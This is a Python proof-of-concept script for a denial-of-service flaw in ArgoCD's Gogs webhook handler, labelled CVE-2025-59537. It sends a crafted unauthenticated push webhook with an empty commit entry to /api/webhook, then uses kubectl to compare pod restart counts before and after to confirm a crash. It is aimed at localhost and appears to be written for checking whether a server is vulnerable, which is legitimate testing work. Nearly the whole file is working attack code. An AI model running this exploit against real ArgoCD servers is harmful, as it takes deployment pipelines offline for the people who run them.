#!/usr/bin/env python3

import requests
import json
import time
import subprocess
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
KUBECTL = os.path.join(SCRIPT_DIR, "build_depend", "kubectl")
if not os.path.exists(KUBECTL):
    KUBECTL = "kubectl"


def get_argocd_pod_status():
    try:
        result = subprocess.run(
            [KUBECTL, "get", "pods", "-n", "argocd", "-l", "app.kubernetes.io/name=argocd-server", "-o", "json"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode == 0:
            pods = json.loads(result.stdout)
            if pods.get("items"):
                pod = pods["items"][0]
                restart_count = pod["status"]["containerStatuses"][0]["restartCount"]
                phase = pod["status"]["phase"]
                return phase, restart_count
    except Exception as e:
        print(f"Error getting pod status: {e}")
    return None, None


def check_argocd_server(base_url):
    try:
        resp = requests.get(f"{base_url}/api/version", verify=False, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False


def send_malicious_gogs_webhook(base_url):
    webhook_url = f"{base_url}/api/webhook"
    
    malicious_payload = {
        "ref": "refs/heads/master",
        "before": "0000000000000000000000000000000000000000",
        "after": "0a05129851238652bf806a400af89fa974ade739",
        "commits": [{}]
    }
    
    headers = {
        "Content-Type": "application/json",
        "X-Gogs-Event": "push"
    }
    
    print(f"[*] Sending malicious Gogs webhook to {webhook_url}")
    print(f"[*] Payload: {json.dumps(malicious_payload)}")
    
    try:
        response = requests.post(
            webhook_url,
            json=malicious_payload,
            headers=headers,
            verify=False,
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200] if response.text else 'empty'}")
        return response
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - server may have crashed!")
        return None
    except requests.exceptions.ReadTimeout:
        print("[!] Read timeout - server may have crashed!")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def main():
    base_url = "https://127.0.0.1:8080"
    
    print("=" * 60)
    print("CVE-2025-59537 PoC - ArgoCD Gogs Webhook DoS")
    print("=" * 60)
    print()
    
    print("[*] Checking ArgoCD server status before attack...")
    phase_before, restart_before = get_argocd_pod_status()
    if phase_before:
        print(f"[*] Pod phase: {phase_before}, Restart count: {restart_before}")
    
    if not check_argocd_server(base_url):
        print("[!] ArgoCD server is not accessible at", base_url)
        print("[!] Make sure port-forward is running:")
        print(f"    {KUBECTL} port-forward svc/argocd-server -n argocd 8080:443")
        return False
    
    print("[+] ArgoCD server is accessible")
    print()
    
    print("[*] Sending malicious payload...")
    response = send_malicious_gogs_webhook(base_url)
    
    print()
    print("[*] Waiting for server to crash and restart...")
    time.sleep(5)
    
    print("[*] Checking ArgoCD server status after attack...")
    phase_after, restart_after = get_argocd_pod_status()
    if phase_after:
        print(f"[*] Pod phase: {phase_after}, Restart count: {restart_after}")
    
    print()
    print("=" * 60)
    print("RESULT:")
    print("=" * 60)
    
    if restart_after is not None and restart_before is not None:
        if restart_after > restart_before:
            print("[+] VULNERABLE! ArgoCD server crashed and restarted.")
            print(f"[+] Restart count increased from {restart_before} to {restart_after}")
            return True
    
    server_accessible = check_argocd_server(base_url)
    if not server_accessible:
        print("[+] VULNERABLE! ArgoCD server is no longer accessible (crashed).")
        return True
    
    if response and response.status_code >= 500:
        print("[+] LIKELY VULNERABLE - Server returned 5xx error")
        return True
    
    print("[-] Could not confirm vulnerability. Server may be patched.")
    print("[-] Or webhook.gogs.secret may be configured.")
    return False


if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
